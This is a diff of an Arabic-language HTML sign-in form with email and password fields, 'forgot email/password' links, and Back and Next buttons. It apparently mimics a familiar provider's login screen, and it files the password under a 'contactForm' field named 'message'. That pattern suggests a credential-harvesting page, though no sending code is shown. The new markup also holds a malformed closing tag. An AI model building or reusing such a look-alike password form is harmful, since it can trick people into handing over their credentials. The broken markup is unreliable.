@@ -40,47 +40,65 @@
         </header>
 
         <!-- نموذج البيانات: يحتوي على حقلي الإدخال -->
-        <form id="contactForm" class="auth-form">
-          <!-- حقل اسم المستخدم أو الإيميل -->
-          <div class="input-field">
-            <input
-              type="email"
-              id="email"
-              placeholder="البريد الإلكتروني أو الهاتف"
-              required
-              autocomplete="username" />
-          </div>
+<form id="contactForm" class="auth-form">
 
-          <div class="helper-text">
-            <a href="#" class="link">هل نسيت البريد الإلكتروني؟</a>
-          </div>
+  <!-- Email -->
+  <div class="input-field">
+    <input
+      type="email"
+      id="email"
+      placeholder="البريد الإلكتروني"
+      required
+      autocomplete="email"
+    />
+  </div>
 
-          <!-- حقل كلمة المرور المطلوب إضافته -->
-          <div class="input-field password-field">
-            <input
-              type="password"
-              id="message"
-              placeholder="أدخل كلمة المرور"
-              required
-              autocomplete="current-password" />
-          </div>
+  <div class="helper-text">
+    <a href="#" class="link">هل نسيت البريد الإلكتروني؟</a>
+  </div>
 
-          <div class="helper-text">
-            <a href="#" class="link">هل نسيت كلمة المرور؟</a>
-          </div>
-        </form>
 
-        <!-- الجزء السفلي: أزرار التفاعل الموزعة يمين ويسار -->
-        
+  <!-- Message -->
+<div class="input-field password-field">
+  <input
+    type="password"
+    id="message"
+    placeholder="كلمة المرور "
+    required
+  />
+</div>
 
- <div class="actions">
-   <button type="button" class="back-button" onclick="history.back()" > Back </button>
-    <button type="submit" id="sendButton" class="send-button" > 
-      <span id="sendButton">التالي</span> 
-      <span id="loader" class="loader"></span> 
+
+  <div class="helper-text">
+    <a href="#" class="link">هل نسيت كلمه المرور؟</a>
+  </div>
+
+
+  <!-- Buttons -->
+  <div class="actions">
+
+    <button
+      type="button"
+      class="back-button"
+      onclick="history.back()"
+    >
+      Back
+    </"button>
+
+    <button
+      type="submit"
+      id="sendButton"
+      class="send-button"
+    >
+      <span id="buttonText">التالي</span>
+      <span id="loader" class="loader"></span>
     </button>
-   </div> 
-   <div id="status" class="status"></div>
+
+  </div>
+
+  <div id="status" class="status"></div>
+
+</form>
         </footer>
       </div>
     </main>
